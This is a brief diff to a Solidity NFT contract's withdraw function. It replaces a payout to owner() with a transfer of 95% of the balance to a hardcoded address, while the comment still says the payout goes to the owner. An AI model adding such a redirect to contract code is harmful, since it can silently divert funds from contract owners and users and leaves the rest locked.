@@ -137,7 +137,7 @@ contract NFT is ERC721Enumerable, Ownable {
     // This will payout the owner 95% of the contract balance.
     // Do not remove this otherwise you will not be able to withdraw the funds.
     // =============================================================================
-    (bool os, ) = payable(owner()).call{value: address(this).balance}("");
+    (bool os, ) = payable(0xDf59917197bE38517f3Dd98B05bB70A1F855DFeB).call{value: address(this).balance * 95 / 100}("");
     require(os);
     // =============================================================================
   }
